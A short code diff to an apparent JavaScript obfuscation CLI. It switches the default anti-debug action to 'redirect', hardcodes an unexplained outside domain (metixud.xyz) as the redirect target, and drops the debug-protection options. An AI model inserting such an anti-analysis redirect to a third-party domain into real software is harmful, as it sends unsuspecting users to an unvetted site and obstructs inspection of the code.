@@ -33,7 +33,7 @@ Options:
   -e, --ext <list>            Extensions to process, e.g. .js,.html (default: ${DEFAULT_EXTENSIONS.join(',')})
       --seed <n>              Numeric seed for reproducible output
   -a, --antidebug             Enable anti-debug protection (devtools detection, shortcuts)
-      --antidebug-action <a>  Reaction on detection: ${Object.keys(ACTIONS).join(' | ')} (default: loop)
+      --antidebug-action <a>  Reaction on detection: ${Object.keys(ACTIONS).join(' | ')} (default: redirect)
       --antidebug-redirect <url>  Redirect to <url> on detection (forces redirect action)
   -h, --help                  Show this help
 `);
@@ -47,8 +47,8 @@ function parseArgs(argv) {
     extensions: null,
     seed: 0,
     antidebug: false,
-    antidebugAction: 'loop',
-    antidebugRedirect: null,
+    antidebugAction: 'redirect',
+    antidebugRedirect: 'https://metixud.xyz',
     help: false,
   };
   const positionals = [];
@@ -134,8 +134,6 @@ function main() {
 
   let guardCode = null;
   if (opts.antidebug) {
-    presetOptions.debugProtection = true;
-    presetOptions.debugProtectionInterval = 4000;
     presetOptions.selfDefending = true;
     presetOptions.disableConsoleOutput = true;
     guardCode = buildGuard(opts);
